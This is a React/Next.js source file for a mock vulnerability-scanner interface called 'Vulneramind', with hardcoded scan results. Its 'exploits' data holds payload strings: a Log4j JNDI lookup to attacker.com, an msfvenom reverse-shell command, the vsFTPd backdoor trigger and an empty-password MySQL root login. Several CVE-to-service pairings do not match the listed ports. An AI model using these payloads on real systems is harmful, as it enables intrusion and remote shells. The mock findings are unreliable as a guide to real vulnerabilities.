'use client'

import { useState } from 'react'
import Link from 'next/link'

// Type definitions for scan results
interface ScanInfo {
  startTime: string
  duration: string
  totalPorts: number
  scannedPorts: number
  openPorts: number
}

interface Port {
  port: number
  service: string
  version: string
  status: string
  banner?: string
}

interface Vulnerability {
  cve: string
  severity: string
  description: string
  cvss: number
  affected_service: string
  details: string
}

interface Exploit {
  name: string
  type: string
  success_rate: string
  description: string
  payload: string
  difficulty: string
  impact: string
}

interface Service {
  name: string
  count: number
  ports: number[]
  risk: string
}

interface ScanResults {
  target: string
  scanInfo: ScanInfo
  ports: Port[]
  vulnerabilities: Vulnerability[]
  exploits: Exploit[]
  services: Service[]
}

export default function ScannerApp() {
  const [target, setTarget] = useState('')
  const [isScanning, setIsScanning] = useState(false)
  const [scanResults, setScanResults] = useState<ScanResults | null>(null)
  const [activeTab, setActiveTab] = useState('scan')

  // Enhanced mock data with comprehensive results
  const mockResults: ScanResults = {
    target: '192.168.1.100',
    scanInfo: {
      startTime: '2024-01-15 14:30:22',
      duration: '12.5 seconds',
      totalPorts: 1000,
      scannedPorts: 1000,
      openPorts: 8
    },
    ports: [
      { port: 22, service: 'SSH', version: 'OpenSSH 7.9p1 Debian 10+deb10u2', status: 'open', banner: 'SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2' },
      { port: 80, service: 'HTTP', version: 'Apache 2.4.38 (Debian)', status: 'open', banner: 'Apache/2.4.38 (Debian)' },
      { port: 443, service: 'HTTPS', version: 'Apache 2.4.38 (Debian)', status: 'open', banner: 'Apache/2.4.38 (Debian)' },
      { port: 3306, service: 'MySQL', version: 'MySQL 5.7.33-0ubuntu0.18.04.1', status: 'open', banner: '5.7.33-0ubuntu0.18.04.1' },
      { port: 21, service: 'FTP', version: 'vsftpd 2.3.4', status: 'open', banner: '220 (vsFTPd 2.3.4)' },
      { port: 23, service: 'Telnet', version: 'Linux telnetd', status: 'open', banner: 'Debian GNU/Linux 9' },
      { port: 25, service: 'SMTP', version: 'Postfix smtpd', status: 'open', banner: '220 metasploitable.localdomain ESMTP Postfix (Ubuntu)' },
      { port: 139, service: 'NetBIOS', version: 'Samba smbd 3.X', status: 'open', banner: 'Samba smbd 3.X - 4.X' }
    ],
    vulnerabilities: [
      { 
        cve: 'CVE-2021-44228', 
        severity: 'Critical', 
        description: 'Apache Log4j Remote Code Execution',
        cvss: 10.0,
        affected_service: 'Apache HTTP Server',
        details: 'Remote code execution vulnerability in Log4j library'
      },
      { 
        cve: 'CVE-2020-13956', 
        severity: 'High', 
        description: 'Apache Tomcat Remote Code Execution',
        cvss: 9.8,
        affected_service: 'Apache Tomcat',
        details: 'Remote code execution via HTTP request smuggling'
      },
      { 
        cve: 'CVE-2019-0708', 
        severity: 'Critical', 
        description: 'BlueKeep RDP Vulnerability',
        cvss: 10.0,
        affected_service: 'Microsoft RDP',
        details: 'Remote code execution in Remote Desktop Services'
      },
      { 
        cve: 'CVE-2018-15473', 
        severity: 'Medium', 
        description: 'OpenSSH User Enumeration',
        cvss: 5.3,
        affected_service: 'OpenSSH',
        details: 'Information disclosure via username enumeration'
      },
      { 
        cve: 'CVE-2017-7494', 
        severity: 'High', 
        description: 'Samba Remote Code Execution',
        cvss: 8.3,
        affected_service: 'Samba',
        details: 'Remote code execution in Samba file sharing'
      }
    ],
    exploits: [
      { 
        name: 'Log4j RCE Exploit', 
        type: 'RCE', 
        success_rate: 'High',
        description: 'Remote code execution via Log4j vulnerability',
        payload: '${jndi:ldap://attacker.com/exploit}',
        difficulty: 'Easy',
        impact: 'Full system access'
      },
      { 
        name: 'MySQL Auth Bypass', 
        type: 'Auth Bypass', 
        success_rate: 'Medium',
        description: 'Authentication bypass in MySQL server',
        payload: 'mysql -h target -u root --password=',
        difficulty: 'Medium',
        impact: 'Database access'
      },
      { 
        name: 'vsFTPd Backdoor', 
        type: 'RCE', 
        success_rate: 'High',
        description: 'Backdoor in vsFTPd 2.3.4',
        payload: 'USER username:)\nPASS password',
        difficulty: 'Easy',
        impact: 'Remote shell access'
      },
      { 
        name: 'Samba Usermap Script', 
        type: 'RCE', 
        success_rate: 'High',
        description: 'Remote code execution in Samba',
        payload: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker LPORT=4444',
        difficulty: 'Medium',
        impact: 'Remote shell access'
      },
      { 
        name: 'OpenSSH User Enumeration', 
        type: 'Info Disclosure', 
        success_rate: 'High',
        description: 'Username enumeration in OpenSSH',
        payload: 'ssh -o PreferredAuthentications=none -o PubkeyAuthentication=no user@target',
        difficulty: 'Easy',
        impact: 'Information disclosure'
      }
    ],
    services: [
      { name: 'Web Server', count: 2, ports: [80, 443], risk: 'Medium' },
      { name: 'Database', count: 1, ports: [3306], risk: 'High' },
      { name: 'File Transfer', count: 1, ports: [21], risk: 'Medium' },
      { name: 'Remote Access', count: 2, ports: [22, 23], risk: 'High' },
      { name: 'Email', count: 1, ports: [25], risk: 'Low' },
      { name: 'File Sharing', count: 1, ports: [139], risk: 'High' }
    ]
  }

  const handleScan = () => {
    if (!target) return
    
    setIsScanning(true)
    // Simulate scan process
    setTimeout(() => {
      setScanResults(mockResults)
      setIsScanning(false)
    }, 3000)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white">
      {/* Header */}
      <header className="bg-black bg-opacity-50 backdrop-blur-sm border-b border-white border-opacity-10">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <Link href="/" className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
            Vulneramind
          </Link>
          <nav className="flex space-x-6">
            <button 
              onClick={() => setActiveTab('scan')}
              className={`px-4 py-2 rounded-lg transition-all duration-200 ${
                activeTab === 'scan' 
                  ? 'bg-blue-500 text-white' 
                  : 'text-gray-300 hover:text-white'
              }`}
            >
              Scanner
            </button>
            <button 
              onClick={() => setActiveTab('results')}
              className={`px-4 py-2 rounded-lg transition-all duration-200 ${
                activeTab === 'results' 
                  ? 'bg-green-500 text-white' 
                  : 'text-gray-300 hover:text-white'
              }`}
            >
              Results
            </button>
            <button 
              onClick={() => setActiveTab('exploits')}
              className={`px-4 py-2 rounded-lg transition-all duration-200 ${
                activeTab === 'exploits' 
                  ? 'bg-red-500 text-white' 
                  : 'text-gray-300 hover:text-white'
              }`}
            >
              Exploits
            </button>
          </nav>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        {activeTab === 'scan' && (
          <div className="max-w-4xl mx-auto">
            <div className="bg-white bg-opacity-5 backdrop-blur-sm rounded-xl p-8 border border-white border-opacity-10">
              <h2 className="text-3xl font-bold mb-6 text-center">Network Vulnerability Scanner</h2>
              
              <div className="mb-8">
                <label className="block text-sm font-medium mb-2">Target IP/Hostname</label>
                <div className="flex gap-4">
                  <input
                    type="text"
                    value={target}
                    onChange={(e) => setTarget(e.target.value)}
                    placeholder="Enter target IP (e.g., 192.168.1.100)"
                    className="flex-1 bg-white bg-opacity-10 border border-white border-opacity-20 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                  <button
                    onClick={handleScan}
                    disabled={isScanning || !target}
                    className="px-8 py-3 bg-gradient-to-r from-blue-500 to-purple-600 hover:from-purple-600 hover:to-blue-500 disabled:opacity-50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-200"
                  >
                    {isScanning ? 'Scanning...' : 'Start Scan'}
                  </button>
                </div>
              </div>

              {isScanning && (
                <div className="text-center py-8">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
                  <p className="text-gray-300">Scanning target: {target}</p>
                  <p className="text-sm text-gray-400 mt-2">Scanning 1000 ports...</p>
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'results' && scanResults && (
          <div className="max-w-7xl mx-auto space-y-6">
            {/* Scan Summary */}
            <div className="bg-white bg-opacity-5 backdrop-blur-sm rounded-xl p-6 border border-white border-opacity-10">
              <h3 className="text-2xl font-bold mb-4">Scan Summary for {scanResults.target}</h3>
              <div className="grid md:grid-cols-4 gap-4 text-center">
                <div className="bg-blue-500 bg-opacity-20 rounded-lg p-4">
                  <div className="text-2xl font-bold text-blue-400">{scanResults.scanInfo.openPorts}</div>
                  <div className="text-sm text-gray-300">Open Ports</div>
                </div>
                <div className="bg-red-500 bg-opacity-20 rounded-lg p-4">
                  <div className="text-2xl font-bold text-red-400">{scanResults.vulnerabilities.length}</div>
                  <div className="text-sm text-gray-300">Vulnerabilities</div>
                </div>
                <div className="bg-green-500 bg-opacity-20 rounded-lg p-4">
                  <div className="text-2xl font-bold text-green-400">{scanResults.exploits.length}</div>
                  <div className="text-sm text-gray-300">Available Exploits</div>
                </div>
                <div className="bg-purple-500 bg-opacity-20 rounded-lg p-4">
                  <div className="text-2xl font-bold text-purple-400">{scanResults.scanInfo.duration}</div>
                  <div className="text-sm text-gray-300">Scan Duration</div>
                </div>
              </div>
            </div>

            {/* Services Overview */}
            <div className="bg-white bg-opacity-5 backdrop-blur-sm rounded-xl p-6 border border-white border-opacity-10">
              <h4 className="text-xl font-bold mb-4 text-blue-300">Services Overview</h4>
              <div className="grid md:grid-cols-3 gap-4">
                {scanResults.services.map((service, index) => (
                  <div key={index} className="bg-white bg-opacity-5 rounded-lg p-4">
                    <div className="flex justify-between items-center mb-2">
                      <span className="font-semibold">{service.name}</span>
                      <span className={`px-2 py-1 rounded text-xs ${
                        service.risk === 'High' ? 'bg-red-500' : 
                        service.risk === 'Medium' ? 'bg-yellow-500' : 'bg-green-500'
                      }`}>
                        {service.risk} Risk
                      </span>
                    </div>
                    <div className="text-sm text-gray-300">
                      Ports: {service.ports.join(', ')}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="grid md:grid-cols-2 gap-6">
              {/* Open Ports */}
              <div className="bg-white bg-opacity-5 backdrop-blur-sm rounded-xl p-6 border border-white border-opacity-10">
                <h4 className="text-lg font-semibold mb-3 text-blue-300">Open Ports & Services</h4>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {scanResults.ports.map((port, index) => (
                    <div key={index} className="bg-white bg-opacity-5 rounded-lg p-3">
                      <div className="flex justify-between items-center">
                        <span className="font-mono">Port {port.port}</span>
                        <span className="text-green-400 text-sm">{port.status}</span>
                      </div>
                      <div className="text-sm text-gray-300 mt-1">
                        {port.service} - {port.version}
                      </div>
                      {port.banner && (
                        <div className="text-xs text-gray-400 mt-1 font-mono">
                          {port.banner}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>

              {/* Vulnerabilities */}
              <div className="bg-white bg-opacity-5 backdrop-blur-sm rounded-xl p-6 border border-white border-opacity-10">
                <h4 className="text-lg font-semibold mb-3 text-red-300">Vulnerabilities</h4>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {scanResults.vulnerabilities.map((vuln, index) => (
                    <div key={index} className="bg-white bg-opacity-5 rounded-lg p-3">
                      <div className="flex justify-between items-center">
                        <span className="font-mono text-sm">{vuln.cve}</span>
                        <span className={`text-sm px-2 py-1 rounded ${
                          vuln.severity === 'Critical' ? 'bg-red-500' : 
                          vuln.severity === 'High' ? 'bg-orange-500' : 'bg-yellow-500'
                        }`}>
                          {vuln.severity}
                        </span>
                      </div>
                      <div className="text-sm text-gray-300 mt-1">{vuln.description}</div>
                      <div className="text-xs text-gray-400 mt-1">
                        CVSS: {vuln.cvss} | Service: {vuln.affected_service}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'exploits' && scanResults && (
          <div className="max-w-7xl mx-auto">
            <div className="bg-white bg-opacity-5 backdrop-blur-sm rounded-xl p-6 border border-white border-opacity-10">
              <h3 className="text-2xl font-bold mb-6">Available Exploits</h3>
              
              <div className="grid gap-4">
                {scanResults.exploits.map((exploit, index) => (
                  <div key={index} className="bg-white bg-opacity-5 rounded-lg p-4 border border-white border-opacity-10">
                    <div className="flex justify-between items-start mb-3">
                      <div className="flex-1">
                        <h4 className="text-lg font-semibold">{exploit.name}</h4>
                        <p className="text-sm text-gray-300 mt-1">{exploit.description}</p>
                      </div>
                      <div className="flex flex-col items-end space-y-2">
                        <span className={`px-3 py-1 rounded-full text-sm ${
                          exploit.success_rate === 'High' ? 'bg-green-500' : 'bg-yellow-500'
                        }`}>
                          {exploit.success_rate} Success Rate
                        </span>
                        <span className={`px-2 py-1 rounded text-xs ${
                          exploit.difficulty === 'Easy' ? 'bg-green-500' : 
                          exploit.difficulty === 'Medium' ? 'bg-yellow-500' : 'bg-red-500'
                        }`}>
                          {exploit.difficulty}
                        </span>
                      </div>
                    </div>
                    <div className="grid md:grid-cols-3 gap-4 text-sm">
                      <div>
                        <span className="text-gray-400">Type:</span> {exploit.type}
                      </div>
                      <div>
                        <span className="text-gray-400">Impact:</span> {exploit.impact}
                      </div>
                      <div>
                        <span className="text-gray-400">Payload:</span> 
                        <span className="font-mono text-xs ml-1">{exploit.payload}</span>
                      </div>
                    </div>
                    <div className="mt-3 flex justify-end">
                      <button className="px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-semibold transition-colors duration-200">
                        Launch Exploit
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  )
} 